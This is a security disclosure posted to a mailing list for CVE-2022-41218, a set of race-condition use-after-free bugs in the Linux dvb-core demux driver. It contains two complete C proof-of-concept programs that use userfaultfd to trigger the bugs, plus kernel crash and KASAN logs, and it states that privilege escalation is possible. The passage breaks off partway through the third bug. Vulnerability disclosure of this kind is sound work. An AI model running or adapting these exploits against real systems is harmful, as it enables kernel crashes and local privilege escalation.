@@ -1,0 +1,927 @@
+
+Date: Fri, 23 Sep 2022 12:06:01 -0700
+From: Hyunwoo Kim <imv4bel@...il.com>
+To: oss-security@...ts.openwall.com
+Cc: imv4bel@...il.com
+Subject: [Report v2] CVE-2022-41218: Linux dvb-core: UAF in dvb-core/dmxdev
+
+Dear,
+
+
+This security issue is a race-condition-to-UAF vulnerability that occurs in the dvb-core system.
+
+CVE-2022-41218 has been assigned to this vulnerability.
+
+
+# Introduction
+This vulnerability is a race condition vulnerability that occurs in drivers/media/dvb-core/dmxdev.c.
+Therefore, a race condition may occur in the usb device driver using this dmxdev.
+
+This vulnerability could be used to trigger 3 UAFs.
+
+
+# Vulnerability
+
+## 1. vmalloc UAF write
+First, the order of the exploit is as follows(I debugged using drivers/media/usb/ttusb-dec/ttusb_dec.c):
+```
+                cpu0                                            cpu1                                    cpu 2
+                                                        1. dvb_dvr_open()
+2. ttusb_dec_disconnect()
+   ttusb_dec_exit_dvb()
+   dvb_dmxdev_release()
+   wait_event(dmxdev->dvr_dvbdev->wait_queue, …)
+                                                                                                3. dvb_demux_open()
+                                                                                                   dvb_demux_ioctl()
+                                                                                                   dvb_usercopy()
+                                                                                                   copy_from_user()  <- userfaultfd stuck
+                                                        4. dvb_dvr_release()
+5. vfree(dmxdev->filter)
+                                                                                                6. copy_from_user()    <- userfaultfd release
+                                                                                                   dvb_demux_do_ioctl()
+                                                                                                   struct dmxdev *dmxdev = dmxdevfilter->dev;  <- UAF!!
+```
+
+The detailed exploit flow is as follows:
+
+1. open() dvr0 among the device nodes. This calls dvb_dvr_open() to cause ‘dvbdev->users++’ to run.
+In this case, when ttusb_dec_disconnect() is executed by removing the usb device, the ‘wait_event(dmxdev->dvr_dvbdev->wait_queue, …)’ condition is caught.
+
+2. Physically remove the USB device.
+In this case, while the ttusb_dec_disconnect() function is being executed, it waits at ‘wait_event(dmxdev->dvr_dvbdev->wait_queue, …)’.
+
+3. open() the demux0 node so that the dvb_demux_open() function is called.
+This function also executes ‘dvbdev->users++’ similarly to the dvb_dvr_open() function in step 1.
+However, this improper reference counting occurs because the dvb_dmxdev_release() function that is currently waiting has already passed the check for dvbdev->users:
+```
+void dvb_dmxdev_release(struct dmxdev *dmxdev)
+{
+        dmxdev->exit = 1;
+        if (dmxdev->dvbdev->users > 1) {    // This check is bypassed. improper reference counting.
+                wait_event(dmxdev->dvbdev->wait_queue,
+                                dmxdev->dvbdev->users == 1);
+        }
+        if (dmxdev->dvr_dvbdev->users > 1) {
+                wait_event(dmxdev->dvr_dvbdev->wait_queue,    // Currently wait()ing here.
+                                dmxdev->dvr_dvbdev->users == 1);
+        }
+
+        dvb_unregister_device(dmxdev->dvbdev);
+        dvb_unregister_device(dmxdev->dvr_dvbdev);
+
+        vfree(dmxdev->filter);
+        dmxdev->filter = NULL;
+        dmxdev->demux->close(dmxdev->demux);
+}
+```
+
+It then calls ioctl() on demux0. When calling, the 3rd argument submits the user-space address set by userfaultfd(or FUSE fs).
+Now while ioctl is running it will hang at copy_from_user() of dvb_usercopy():
+```
+int dvb_usercopy(struct file *file,
+                     unsigned int cmd, unsigned long arg,
+                     int (*func)(struct file *file,
+                     unsigned int cmd, void *arg))
+{
+        char    sbuf[128];
+        void    *mbuf = NULL;
+        void    *parg = NULL;
+        int     err  = -EINVAL;
+
+        /*  Copy arguments into temp kernel buffer  */
+        switch (_IOC_DIR(cmd)) {
+        case _IOC_NONE:
+                /*
+                 * For this command, the pointer is actually an integer
+                 * argument.
+                 */
+                parg = (void *) arg;
+                break;
+        case _IOC_READ: /* some v4l ioctls are marked wrong ... */
+        case _IOC_WRITE:
+        case (_IOC_WRITE | _IOC_READ):
+                if (_IOC_SIZE(cmd) <= sizeof(sbuf)) {
+                        parg = sbuf;
+                } else {
+                        /* too big to allocate from stack */
+                        mbuf = kmalloc(_IOC_SIZE(cmd), GFP_KERNEL);
+                        if (NULL == mbuf)
+                                return -ENOMEM;
+                        parg = mbuf;
+                }
+
+                err = -EFAULT;
+                if (copy_from_user(parg, (void __user *)arg, _IOC_SIZE(cmd)))   // here
+                        goto out;
+                break;
+        }
+```
+
+4. close() the fd in the thread that open()ed the dvr0 node.
+Then dvb_dvr_release() is called, and ‘dvbdev->users--’ and ‘wake_up(&dvbdev->wait_queue)’ are executed to wake up the dvb_dmxdev_release() function, which is the .disconnect flow.
+
+5. In the .disconnect flow, dvb_dmxdev_release() function, vfree(dmxdev->filter) is executed.
+
+6. Release userfaultfd from the demux0 ioctl thread that set userfaultfd.
+This will cause the UAF to occur by reading the ‘dmxdev->filter’ address you just released from .disconnect.
+UAF can now be used in all cases of dvb_demux_do_ioctl(), and even LPE is possible when linked with BPF.
+
+
+Here is the PoC code:
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <unistd.h>
+#include <string.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <errno.h>
+#include <sched.h>
+#include <malloc.h>
+#include <poll.h>
+#include <pty.h>
+#include <sys/syscall.h>
+#include <sys/ioctl.h>
+#include <sys/wait.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <sys/ipc.h>
+#include <linux/userfaultfd.h>
+#include <sys/time.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/un.h>
+#include <linux/netlink.h>
+#include <stddef.h>
+#include <sys/param.h>
+#include <sys/resource.h>
+#include <linux/bpf.h>
+#include <linux/ioctl.h>
+#include <linux/types.h>
+
+#include <linux/dvb/dmx.h>
+
+
+#define CPU_0 1
+#define CPU_1 2
+#define CPU_2 3
+#define CPU_3 4
+#define UFFD_COUNT 1
+
+#define die() do { \
+        fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
+        exit(EXIT_FAILURE); \
+} while (0)
+
+
+int fd;
+int page_size;
+int set1 = 0;
+int set2 = 0;
+int set3 = 0;
+char *addr;
+char *leak_addr;
+char *text_addr;
+
+
+void set_affinity(unsigned long mask) {
+        if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0) {
+                perror("pthread_setaffinity_np");
+        }
+        return;
+}
+
+static void *fault_handler_thread(void *arg) {
+        static struct uffd_msg msg;
+        long uffd;
+        static char *page = NULL;
+        struct uffdio_copy uffdio_copy;
+        ssize_t nread;
+        int qid;
+        uintptr_t fault_addr;
+
+        uffd = (long)arg;
+
+        if (page == NULL) {
+                page = mmap(NULL, page_size,
+                                PROT_READ | PROT_WRITE,
+                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+                if (page == MAP_FAILED){
+                        perror("mmap");
+                        die();
+                }
+        }
+
+        for (;;) {
+                struct pollfd pollfd;
+                int nready;
+                pollfd.fd = uffd;
+                pollfd.events = POLLIN;
+                nready = poll(&pollfd, 1, -1);
+                if (nready == -1) {
+                        perror("poll");
+                        die();
+                }
+
+                nread = read(uffd, &msg, sizeof(msg));
+                if (nread == 0) {
+                        printf("EOF on userfaultfd!\n");
+                        die();
+                }
+
+                if (nread == -1) {
+                        perror("read");
+                        die();
+                }
+
+                if (msg.event != UFFD_EVENT_PAGEFAULT) {
+                        perror("Unexpected event on userfaultfd");
+                        die();
+                }
+
+                fault_addr = msg.arg.pagefault.address;
+
+                if (fault_addr == addr) {
+                        printf("[step 4] ioctl ufd  pid : %ld\n", syscall(SYS_gettid));
+
+                        set2 = 1;
+                        while(!set3);
+
+                        sleep(5);
+
+                        uffdio_copy.src = (unsigned long)page;
+                        uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address & ~(page_size - 1);
+                        uffdio_copy.len = page_size;
+                        uffdio_copy.mode = 0;
+                        uffdio_copy.copy = 0;
+                        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) {
+                                perror("fault_handler_thread() - ioctl-UFFDIO_COPY case 1");
+                                die();
+                        }
+
+                }
+        }
+}
+
+void set_userfaultfd(void) {
+        long uffd[UFFD_COUNT];
+        struct uffdio_api uffdio_api[UFFD_COUNT];
+        struct uffdio_register uffdio_register;
+        pthread_t pf_hdr[UFFD_COUNT];
+        int p[UFFD_COUNT];
+        unsigned int size;
+
+        size = page_size;
+
+        addr = (char *)mmap(NULL,
+                        page_size * UFFD_COUNT,
+                        PROT_READ | PROT_WRITE,
+                        MAP_PRIVATE | MAP_ANONYMOUS,
+                        -1, 0);
+
+        for (int i = 0; i < UFFD_COUNT; i++) {
+                uffd[i] = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+                if (uffd[i] == -1) {
+                        perror("syscall : userfaultfd");
+                        die();
+                }
+
+                uffdio_api[i].api = UFFD_API;
+                uffdio_api[i].features = 0;
+                if (ioctl(uffd[i], UFFDIO_API, &uffdio_api[i]) == -1) {
+                        perror("ioctl() : UFFDIO_API");
+                        die();
+                }
+
+                uffdio_register.range.start = (unsigned long)(addr + (page_size * i));
+                uffdio_register.range.len   = size;
+                uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
+                if (ioctl(uffd[i], UFFDIO_REGISTER, &uffdio_register) == -1) {
+                        perror("ioctl() : UFFDIO_REGISTER");
+                        die();
+                }
+
+                p[i] = pthread_create(&pf_hdr[i], NULL, fault_handler_thread, (void *)uffd[i]);
+                if (p[i] != 0) {
+                        perror("pthread_create : page_fault_handler_thread");
+                        die();
+                }
+        }
+}
+
+
+void *dvb_wait_queue(void) {
+        int fd;
+        int ret;
+
+        //set_affinity(CPU_2);
+
+        fd = open("/dev/dvb/adapter0/dvr0", O_RDONLY);
+        if (fd > 0) {
+                printf("[step 1] dvr0 open() : %d  pid : %ld\n", fd, syscall(SYS_gettid));
+        } else {
+                perror("/dev/dvb/adapter0/dvr0 open() failed");
+                die();
+        }
+        set1 = 1;
+
+
+        while(!set2);
+        sleep(5);
+
+        close(fd);
+        printf("[step 5] dvr0 close()  pid : %ld\n", syscall(SYS_gettid));
+
+        sleep(5);
+        set3 = 1;
+}
+
+void *demux_ioctl(void) {
+        int ret;
+        unsigned char tmp;
+        char input[2];
+        int fd;
+
+        //set_affinity(CPU_1);
+
+        while(!set1);
+        printf("Disconnect now (After disconnecting, type enter)\n");
+        read(0, input, 1);
+        printf("[step 2] disconnect dvb usb\n");
+
+
+        fd = open("/dev/dvb/adapter0/demux0", O_RDWR);
+        if (fd > 0) {
+                printf("[step 3] demux0 open() : %d  pid : %ld\n", fd, syscall(SYS_gettid));
+
+        } else {
+                perror("/dev/dvb/adapter0/demux0 open() failed");
+                die();
+        }
+
+
+        ret = ioctl(fd, DMX_SET_FILTER, addr);
+        printf("[step 6] demux0 ioctl()  ret : %d  pid : %ld\n", ret, syscall(SYS_gettid));
+
+        sleep(5);
+}
+
+int main() {
+        pthread_t pf_hdr;
+        int p1, p2;
+        int status1, status2;
+        pthread_t hdr1, hdr2;
+        int ret;
+
+        page_size = sysconf(_SC_PAGE_SIZE);
+
+        //set_affinity(CPU_0);
+
+        set_userfaultfd();
+
+        p1 = pthread_create(&hdr1, NULL, dvb_wait_queue, (void *)NULL);
+        if (p1 != 0) {
+                perror("pthread_create 1");
+                die();
+        }
+
+        p2 = pthread_create(&hdr2, NULL, demux_ioctl, (void *)NULL);
+        if (p2 != 0) {
+                perror("pthread_create 2");
+                die();
+        }
+
+        pthread_join(hdr1, (void **)&status1);
+        pthread_join(hdr2, (void **)&status2);
+
+        return 0;
+}
+```
+
+
+The kernel log looks like this:
+```
+[   83.990720] BUG: unable to handle page fault for address: ffffc900013c5060
+[   83.990733] #PF: supervisor read access in kernel mode
+[   83.990739] #PF: error_code(0x0000) - not-present page
+[   83.990744] PGD 100000067 P4D 100000067 PUD 1001dd067 PMD 1078fc067 PTE 0
+[   83.990760] Oops: 0000 [#1] PREEMPT SMP NOPTI
+[   83.990768] CPU: 2 PID: 2580 Comm: exploit Not tainted 6.0.0-rc2+ #3
+[   83.990776] Hardware name: Gigabyte Technology Co., Ltd. B460MDS3H/B460M DS3H, BIOS F3 05/27/2020
+[   83.990781] RIP: 0010:dvb_demux_do_ioctl+0x22/0x5b0 [dvb_core]
+[   83.990809] Code: 00 00 00 00 0f 1f 40 00 0f 1f 44 00 00 55 48 89 e5 41 57 49 89 d7 41 56 41 55 41 54 53 89 f3 48 84
+[   83.990816] RSP: 0018:ffffc90001a3fd10 EFLAGS: 00010282
+[   83.990824] RAX: 0000000000000000 RBX: 00000000403c6f2b RCX: ffffffffc051c520
+[   83.990830] RDX: ffffc90001a3fd80 RSI: 00000000403c6f2b RDI: ffff88810c4adc00
+[   83.990835] RBP: ffffc90001a3fd58 R08: 0000000000000000 R09: 0000000000000000
+[   83.990840] R10: 0000000000000000 R11: 0000000000000000 R12: 00000000fffffff2
+[   83.990845] R13: ffffc900013c5000 R14: ffff88810c4adc00 R15: ffffc90001a3fd80
+[   83.990850] FS:  00007f0c4fdd7640(0000) GS:ffff88844ea80000(0000) knlGS:0000000000000000
+[   83.990857] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   83.990863] CR2: ffffc900013c5060 CR3: 000000010b31e001 CR4: 00000000007706e0
+[   83.990869] PKRU: 55555554
+[   83.990873] Call Trace:
+[   83.990877]  <TASK>
+[   83.990886]  dvb_usercopy+0x55/0x1a0 [dvb_core]
+[   83.990907]  ? dvb_dmxdev_filter_start+0x3b0/0x3b0 [dvb_core]
+[   83.990932]  dvb_demux_ioctl+0x15/0x20 [dvb_core]
+[   83.990951]  __x64_sys_ioctl+0x92/0xd0
+[   83.990965]  do_syscall_64+0x59/0x90
+[   83.990973]  ? debug_smp_processor_id+0x17/0x20
+[   83.990984]  ? fpregs_assert_state_consistent+0x2a/0x50
+[   83.990995]  ? exit_to_user_mode_prepare+0x49/0x1a0
+[   83.991007]  ? syscall_exit_to_user_mode+0x26/0x50
+[   83.991016]  ? __x64_sys_write+0x19/0x20
+[   83.991024]  ? do_syscall_64+0x69/0x90
+[   83.991030]  ? irqentry_exit_to_user_mode+0x9/0x20
+[   83.991039]  ? irqentry_exit+0x3b/0x50
+[   83.991048]  ? exc_page_fault+0x87/0x180
+[   83.991056]  entry_SYSCALL_64_after_hwframe+0x63/0xcd
+[   83.991068] RIP: 0033:0x454b7f
+[   83.991075] Code: 00 48 89 44 24 18 31 c0 48 8d 44 24 60 c7 04 24 10 00 00 00 48 89 44 24 08 48 8d 44 24 20 48 89 40
+[   83.991081] RSP: 002b:00007f0c4fdd7150 EFLAGS: 00000246 ORIG_RAX: 0000000000000010
+[   83.991090] RAX: ffffffffffffffda RBX: 00007f0c4fdd7640 RCX: 0000000000454b7f
+[   83.991095] RDX: 00007f0c50dda000 RSI: 00000000403c6f2b RDI: 0000000000000005
+[   83.991100] RBP: 00007f0c4fdd71d0 R08: 0000000000000000 R09: 0000000000000000
+[   83.991104] R10: 000000000000000a R11: 0000000000000246 R12: 00007f0c4fdd7640
+[   83.991109] R13: 0000000000000000 R14: 000000000041ba00 R15: 00007f0c4f5d7000
+[   83.991118]  </TASK>
+[   83.991121] Modules linked in: snd_usb_audio usbhid hid snd_usbmidi_lib ttusb_dec ttusbdecfe dvb_core mc snd_sof_pca
+[   83.991249]  sysfillrect rapl sysimgblt snd intel_cstate mei_me soundcore ee1004 mei gigabyte_wmi wmi_bmof serial_mt
+[   83.991333] CR2: ffffc900013c5060
+[   83.991339] ---[ end trace 0000000000000000 ]---
+[   83.991344] RIP: 0010:dvb_demux_do_ioctl+0x22/0x5b0 [dvb_core]
+[   83.991366] Code: 00 00 00 00 0f 1f 40 00 0f 1f 44 00 00 55 48 89 e5 41 57 49 89 d7 41 56 41 55 41 54 53 89 f3 48 84
+[   83.991372] RSP: 0018:ffffc90001a3fd10 EFLAGS: 00010282
+[   83.991378] RAX: 0000000000000000 RBX: 00000000403c6f2b RCX: ffffffffc051c520
+[   83.991383] RDX: ffffc90001a3fd80 RSI: 00000000403c6f2b RDI: ffff88810c4adc00
+[   83.991387] RBP: ffffc90001a3fd58 R08: 0000000000000000 R09: 0000000000000000
+[   83.991392] R10: 0000000000000000 R11: 0000000000000000 R12: 00000000fffffff2
+[   83.991396] R13: ffffc900013c5000 R14: ffff88810c4adc00 R15: ffffc90001a3fd80
+[   83.991401] FS:  00007f0c4fdd7640(0000) GS:ffff88844ea80000(0000) knlGS:0000000000000000
+[   83.991407] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   83.991412] CR2: ffffc900013c5060 CR3: 000000010b31e001 CR4: 00000000007706e0
+[   83.991417] PKRU: 55555554
+```
+
+
+## 2. UAF that allows arbitrary address execution
+First, the order of the exploit is as follows:
+```
+                cpu0                                            cpu1                                    cpu 2
+                                                        1. dvb_dvr_open()
+2. ttusb_dec_disconnect()
+   ttusb_dec_exit_dvb()
+   dvb_dmxdev_release()
+   wait_event(dmxdev->dvr_dvbdev->wait_queue, ...)
+                                                                                                3. dvb_demux_open()
+                                                        4. dvb_dvr_release()
+5. dvb_unregister_device(dmxdev->dvbdev)
+   dvb_free_device()
+   kfree (dvbdev->fops)
+                                                                                                6. close(demux0)
+                                                                                                   __x64_sys_close()
+                                                                                                   close_fd()
+                                                                                                   filp_close()
+                                                                                                   filp->f_op->flush(filp, id);  <- UAF!!
+```
+
+The detailed exploit flow is as follows:
+
+1 ~ 4. The order of 1-4 is the same as the first vulnerability.
+
+5. In the .disconnect flow, "dvb_unregister_device(dmxdev->dvbdev) -> dvb_free_device() -> kfree (dvbdev->fops)" is executed.
+Here, kfree()ed "dvbdev->fops" is the target of UAF vulnerability.
+
+6. close() the demux0 fd in the thread that open()ed the demux0 node.
+In fact, when opening a dvb device node such as demux0, "dvb_device_open()" is called first, not dvb_XXX_open():
+```
+static int dvb_device_open(struct inode *inode, struct file *file)
+{
+        struct dvb_device *dvbdev;
+
+        mutex_lock(&dvbdev_mutex);
+        down_read(&minor_rwsem);
+        dvbdev = dvb_minors[iminor(inode)];
+
+        if (dvbdev && dvbdev->fops) {
+                int err = 0;
+                const struct file_operations *new_fops;
+
+                new_fops = fops_get(dvbdev->fops);
+                if (!new_fops)
+                        goto fail;
+                file->private_data = dvbdev;
+                replace_fops(file, new_fops);    // replace fops here.
+                if (file->f_op->open)
+                        err = file->f_op->open(inode, file);    // call dvb_XXX_open()
+                up_read(&minor_rwsem);
+                mutex_unlock(&dvbdev_mutex);
+                return err;
+        }
+fail:
+        up_read(&minor_rwsem);
+        mutex_unlock(&dvbdev_mutex);
+        return -ENODEV;
+}
+```
+After the above function is called, "replace_fops(file, new_fops);" to replace file->f_op with "dvbdev->fops".
+This "dvbdev->fops" is the target of this UAF vulnerability, as explained in step 5.
+
+Returning to the flow, the close() system calls are executed in the order of "__x64_sys_close() -> close_fd() -> filp_close()" because close(demux0) was called:
+```
+int filp_close(struct file *filp, fl_owner_t id)
+{
+        int retval = 0;
+
+        if (!file_count(filp)) {
+                printk(KERN_ERR "VFS: Close: file count is 0\n");
+                return 0;
+        }
+
+        if (filp->f_op->flush)
+                retval = filp->f_op->flush(filp, id);    // UAF!!
+
+        if (likely(!(filp->f_mode & FMODE_PATH))) {
+                dnotify_flush(filp, id);
+                locks_remove_posix(filp, id);
+        }
+        fput(filp);
+        return retval;
+}
+```
+In the above function, "filp->f_op->flush(filp, id);" is called, and UAF occurs because this f_op is the fops kfree()ed in step 5.
+This, in conjunction with kmalloc heap spraying, becomes a vulnerability that can execute any desired address.
+
+Here is the PoC code:
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <unistd.h>
+#include <string.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <errno.h>
+#include <sched.h>
+#include <malloc.h>
+#include <poll.h>
+#include <pty.h>
+#include <sys/syscall.h>
+#include <sys/ioctl.h>
+#include <sys/wait.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <sys/ipc.h>
+#include <linux/userfaultfd.h>
+#include <sys/time.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/un.h>
+#include <linux/netlink.h>
+#include <stddef.h>
+#include <sys/param.h>
+#include <sys/resource.h>
+#include <linux/bpf.h>
+#include <linux/ioctl.h>
+#include <linux/types.h>
+
+#include <linux/dvb/dmx.h>
+
+
+#define CPU_0 1
+#define CPU_1 2
+#define CPU_2 3
+#define CPU_3 4
+
+#define die() do { \
+        fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
+        exit(EXIT_FAILURE); \
+} while (0)
+
+
+int fd;
+int set1 = 0;
+int set2 = 0;
+int set3 = 0;
+
+void set_affinity(unsigned long mask) {
+        if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0) {
+                perror("pthread_setaffinity_np");
+        }
+        return;
+}
+
+void *dvb_wait_queue(void) {
+        int fd;
+        int ret;
+
+        //set_affinity(CPU_2);
+
+        fd = open("/dev/dvb/adapter0/dvr0", O_RDONLY);
+        if (fd > 0) {
+                printf("[step 1] dvr0 open() : %d  pid : %ld\n", fd, syscall(SYS_gettid));
+        } else {
+                perror("/dev/dvb/adapter0/dvr0 open() failed");
+                die();
+        }
+        set1 = 1;
+
+
+        while(!set2);
+        close(fd);
+        set3 = 1;
+        printf("[step 4] dvr0 close()  pid : %ld\n", syscall(SYS_gettid));
+
+        sleep(5);
+}
+
+void *demux_close(void) {
+        int ret;
+        unsigned char tmp;
+        char input[2];
+        int fd;
+
+        //set_affinity(CPU_1);
+
+        while(!set1);
+        printf("Disconnect now (After disconnecting, type enter) : \n");
+        read(0, input, 1);
+        printf("[step 2] disconnect dvb usb\n");
+
+
+        fd = open("/dev/dvb/adapter0/demux0", O_RDWR);
+        if (fd > 0) {
+                printf("[step 3] demux0 open() : %d  pid : %ld\n", fd, syscall(SYS_gettid));
+
+        } else {
+                perror("/dev/dvb/adapter0/demux0 open() failed");
+                die();
+        }
+        set2 = 1;
+
+
+        while(!set3);
+        usleep(60);
+        close(fd);
+        printf("[step 5] demux0 close()  pid : %ld\n", syscall(SYS_gettid));
+
+        sleep(5);
+}
+
+int main() {
+        pthread_t pf_hdr;
+        int p1, p2;
+        int status1, status2;
+        pthread_t hdr1, hdr2;
+        int ret;
+
+        //set_affinity(CPU_0);
+
+        p1 = pthread_create(&hdr1, NULL, dvb_wait_queue, (void *)NULL);
+        if (p1 != 0) {
+                perror("pthread_create 1");
+                die();
+        }
+
+        p2 = pthread_create(&hdr2, NULL, demux_close, (void *)NULL);
+        if (p2 != 0) {
+                perror("pthread_create 2");
+                die();
+        }
+
+        pthread_join(hdr1, (void **)&status1);
+        pthread_join(hdr2, (void **)&status2);
+
+        return 0;
+}
+```
+
+Here is the KASAN log:
+```
+[  708.982899] ==================================================================
+[  708.982921] BUG: KASAN: use-after-free in filp_close+0x119/0x140
+[  708.982929] Read of size 8 at addr ffff888114bd4078 by task exploit2/2918
+
+[  708.982933] CPU: 7 PID: 2918 Comm: exploit2 Not tainted 6.0.0-rc2+ #4
+[  708.982936] Hardware name: Gigabyte Technology Co., Ltd. B460MDS3H/B460M DS3H, BIOS F3 05/27/2020
+[  708.982938] Call Trace:
+[  708.982954]  <TASK>
+[  708.982956]  dump_stack_lvl+0x49/0x63
+[  708.982960]  print_report.cold+0x5e/0x5d9
+[  708.982963]  ? filp_close+0x119/0x140
+[  708.982966]  kasan_report+0xa0/0x120
+[  708.982969]  ? filp_close+0x119/0x140
+[  708.982972]  __asan_report_load8_noabort+0x14/0x20
+[  708.982975]  filp_close+0x119/0x140
+[  708.982978]  close_fd+0x75/0x90
+[  708.982981]  __x64_sys_close+0x30/0x80
+[  708.982984]  do_syscall_64+0x59/0x90
+[  708.982987]  ? syscall_exit_to_user_mode+0x26/0x50
+[  708.982990]  ? do_syscall_64+0x69/0x90
+[  708.982994]  ? syscall_exit_to_user_mode+0x26/0x50
+[  708.983017]  ? __do_sys_gettid+0x1b/0x30
+[  708.983022]  ? do_syscall_64+0x69/0x90
+[  708.983027]  ? exit_to_user_mode_prepare+0x49/0x1a0
+[  708.983035]  ? irqentry_exit_to_user_mode+0x9/0x20
+[  708.983041]  ? irqentry_exit+0x3b/0x50
+[  708.983045]  ? exc_page_fault+0x72/0xf0
+[  708.983050]  entry_SYSCALL_64_after_hwframe+0x63/0xcd
+[  708.983072] RIP: 0033:0x45396b
+[  708.983077] Code: 03 00 00 00 0f 05 48 3d 00 f0 ff ff 77 41 c3 48 83 ec 18 89 7c 24 0c e8 33 a9 02 00 8b 7c 24 0c 41 89 c0 b8 03 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 35 44 89 c7 89 44 24 0c e8 81 a9 02 00 8b 44
+[  708.983081] RSP: 002b:00007f55128b41a0 EFLAGS: 00000293 ORIG_RAX: 0000000000000003
+[  708.983087] RAX: ffffffffffffffda RBX: 00007f55128b4640 RCX: 000000000045396b
+[  708.983091] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000004
+[  708.983094] RBP: 00007f55128b41d0 R08: 0000000000000000 R09: 0000000000000000
+[  708.983097] R10: 0000000000000000 R11: 0000000000000293 R12: 00007f55128b4640
+[  708.983100] R13: 0000000000000000 R14: 000000000041b3e0 R15: 00007f55120b4000
+[  708.983107]  </TASK>
+
+[  708.983130] Allocated by task 663:
+[  708.983133]  kasan_save_stack+0x26/0x50
+[  708.983137]  __kasan_kmalloc+0xae/0xe0
+[  708.983140]  __kmalloc_node+0x185/0x420
+[  708.983145]  memcg_alloc_slab_cgroups+0x8a/0x130
+[  708.983149]  allocate_slab+0x389/0x4a0
+[  708.983152]  ___slab_alloc+0x6c5/0xa50
+[  708.983155]  __slab_alloc.constprop.0+0x5a/0xb0
+[  708.983159]  kmem_cache_alloc+0x2e3/0x320
+[  708.983162]  seq_open+0x57/0x160
+[  708.983166]  kernfs_fop_open+0x4f0/0xc10
+[  708.983171]  do_dentry_open+0x404/0xf80
+[  708.983174]  vfs_open+0x9f/0xd0
+[  708.983177]  path_openat+0xd58/0x3f60
+[  708.983181]  do_filp_open+0x1b1/0x3e0
+[  708.983184]  do_sys_openat2+0x132/0x450
+[  708.983187]  __x64_sys_openat+0x128/0x210
+[  708.983191]  do_syscall_64+0x59/0x90
+[  708.983194]  entry_SYSCALL_64_after_hwframe+0x63/0xcd
+
+[  708.983201] Freed by task 159:
+[  708.983204]  kasan_save_stack+0x26/0x50
+[  708.983207]  kasan_set_track+0x25/0x40
+[  708.983211]  kasan_set_free_info+0x24/0x40
+[  708.983215]  ____kasan_slab_free+0x176/0x1e0
+[  708.983218]  __kasan_slab_free+0x12/0x20
+[  708.983221]  slab_free_freelist_hook+0xd0/0x1a0
+[  708.983224]  kfree+0x1ae/0x3e0
+[  708.983227]  dvb_free_device.part.0+0x33/0x70 [dvb_core]
+[  708.983241]  dvb_unregister_device+0x20/0x30 [dvb_core]
+[  708.983248]  dvb_dmxdev_release+0x3ba/0x4e3 [dvb_core]
+[  708.983255]  ttusb_dec_disconnect+0x3d8/0x499 [ttusb_dec]
+[  708.983258]  usb_unbind_interface+0x187/0x7c0
+[  708.983261]  device_remove+0x117/0x170
+[  708.983264]  device_release_driver_internal+0x418/0x660
+[  708.983266]  device_release_driver+0x12/0x20
+[  708.983268]  bus_remove_device+0x28f/0x540
+[  708.983270]  device_del+0x501/0xc30
+[  708.983273]  usb_disable_device+0x2a5/0x660
+[  708.983274]  usb_disconnect.cold+0x1f9/0x620
+[  708.983277]  hub_event+0x16d3/0x3d20
+[  708.983280]  process_one_work+0x778/0x11c0
+[  708.983283]  worker_thread+0x544/0x1180
+[  708.983285]  kthread+0x280/0x320
+[  708.983286]  ret_from_fork+0x1f/0x30
+
+[  708.983291] The buggy address belongs to the object at ffff888114bd4000
+                which belongs to the cache kmalloc-512 of size 512
+[  708.983293] The buggy address is located 120 bytes inside of
+                512-byte region [ffff888114bd4000, ffff888114bd4200)
+
+[  708.983297] The buggy address belongs to the physical page:
+[  708.983298] page:000000009b45bbf6 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x114bd0
+[  708.983301] head:000000009b45bbf6 order:3 compound_mapcount:0 compound_pincount:0
+[  708.983303] flags: 0x17ffffc0010200(slab|head|node=0|zone=2|lastcpupid=0x1fffff)
+[  708.983307] raw: 0017ffffc0010200 dead000000000100 dead000000000122 ffff888100042c80
+[  708.983309] raw: 0000000000000000 0000000080200020 00000001ffffffff 0000000000000000
+[  708.983311] page dumped because: kasan: bad access detected
+
+[  708.983313] Memory state around the buggy address:
+[  708.983314]  ffff888114bd3f00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[  708.983316]  ffff888114bd3f80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[  708.983318] >ffff888114bd4000: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[  708.983320]                                                                 ^
+[  708.983321]  ffff888114bd4080: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[  708.983323]  ffff888114bd4100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[  708.983325] ==================================================================
+[  708.983336] Disabling lock debugging due to kernel taint
+```
+
+
+## 3. slab UAF write
+The third slab UAF vulnerability is almost identical to the second one.
+It only occurs in minute race condition time differences.
+
+the order of the exploit is as follows:
+```
+                cpu0                                            cpu1                                    cpu 2
+                                                        1. dvb_dvr_open()
+2. ttusb_dec_disconnect()
+   ttusb_dec_exit_dvb()
+   dvb_dmxdev_release()
+   wait_event(dmxdev->dvr_dvbdev->wait_queue, ...)
+                                                                                                3. dvb_demux_open()
+                                                        4. dvb_dvr_release()
+5. dvb_unregister_device(dmxdev->dvbdev)
+   dvb_free_device()
+   kfree (dvbdev)
+                                                                                                6. dvb_demux_release()
+                                                                                                   dmxdev->dvbdev->users--;  <- UAF!!
+```
+
+The detailed exploit flow is as follows:
+
